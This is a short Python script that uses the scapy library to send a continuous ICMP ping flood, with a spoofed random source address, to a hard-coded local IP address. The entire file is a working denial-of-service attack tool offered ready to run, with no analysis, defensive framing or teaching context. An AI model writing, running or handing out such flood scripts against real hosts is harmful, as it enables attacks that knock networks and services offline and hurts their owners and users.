from scapy.all import *

def ping_flood(target_ip):
    source_ip = RandIP()
    packet = IP(src=str(source_ip), dst=target_ip)/ICMP()
    print(f"Ping flood is being sent to {target_ip}...")
    send(packet, loop=1, inter=0.0001)

target_ip = "192.168.1.128"
ping_flood(target_ip)
